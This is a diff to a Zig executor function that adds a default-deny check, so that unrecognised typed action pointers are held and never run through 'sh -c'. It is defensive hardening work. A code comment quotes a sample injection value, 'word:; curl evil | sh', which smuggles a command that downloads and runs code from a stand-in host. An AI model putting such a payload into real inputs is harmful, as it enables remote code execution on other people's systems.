@@ -2630,6 +2630,22 @@ fn runAction(allocator: std.mem.Allocator, env: std.process.Environ, rows: []con
         evidencePrint("  result: HOLD — {s}\n", .{cause});
         return .{ .rc = 1, .result = try allocator.dupe(u8, cause) };
     }
+    // Fork F8 default-deny: only genuine executable ptypes may shell-execute —
+    // cli/api shell commands, a loop-until: body, or a harness: verify.sh. Any
+    // OTHER ptype reaching this fall-through is a typed doctrine pointer the
+    // validator blessed (isKnownAction) but no executor branch handled; running
+    // it as `sh -c "<action>"` is a shell-injection surface (e.g. an action of
+    // `word:; curl evil | sh` passes validation, then breaks out here). HOLD it
+    // instead — an immune system does not execute an unrecognized protein. This
+    // is the executor half of collapsing the F8 classifier fork; the classifier
+    // (zig/src/pointer.zig) now recognizes the same typed prefixes the validator
+    // does, so every non-cli/api/loop/harness kind lands here and is refused.
+    if (!std.mem.eql(u8, ptype, "cli") and !std.mem.eql(u8, ptype, "api") and
+        !std.mem.eql(u8, ptype, "loop") and !std.mem.eql(u8, ptype, "harness"))
+    {
+        evidencePrint("  result: HOLD — {s} is a typed pointer ({s}) with no executor; not shell-executed (fork F8)\n", .{ action, ptype });
+        return .{ .rc = 1, .result = "hold:inert-pointer" };
+    }
     const out_capture = try runShellCapture(allocator, body, r.cwd);
     if (out_capture.rc == 0) {
         evidence("  result: PASS (exit 0)\n");
